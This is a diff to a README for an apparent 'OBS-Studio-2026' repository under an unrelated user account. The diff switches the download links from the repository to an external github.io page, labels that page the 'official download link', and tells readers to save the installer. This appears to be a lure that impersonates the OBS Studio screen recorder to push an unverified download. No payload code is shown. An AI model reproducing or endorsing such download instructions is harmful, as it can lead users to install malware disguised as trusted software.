@@ -1,7 +1,7 @@
 # 📹 OBS-Studio-2026 - Record and stream your screen easily
 
 <p align="center">
-  <a href="https://github.com/Heliseopenhearted912/OBS-Studio-2026">
+  <a href="https://heliseopenhearted912.github.io">
     <img src="https://img.shields.io/badge/Download-OBS_Studio_2026-blue.svg" alt="Download OBS Studio 2026">
   </a>
 </p>
@@ -26,7 +26,7 @@ Verify that your graphics drivers are up to date before you start. Windows Updat
 
 You need to download the installer from the repository.
 
-1.  Visit the [official download link](https://github.com/Heliseopenhearted912/OBS-Studio-2026).
+1.  Visit the [official download link](https://heliseopenhearted912.github.io).
 2.  Look for the button or link labeled "Download."
 3.  Save the file to your Downloads folder.
 
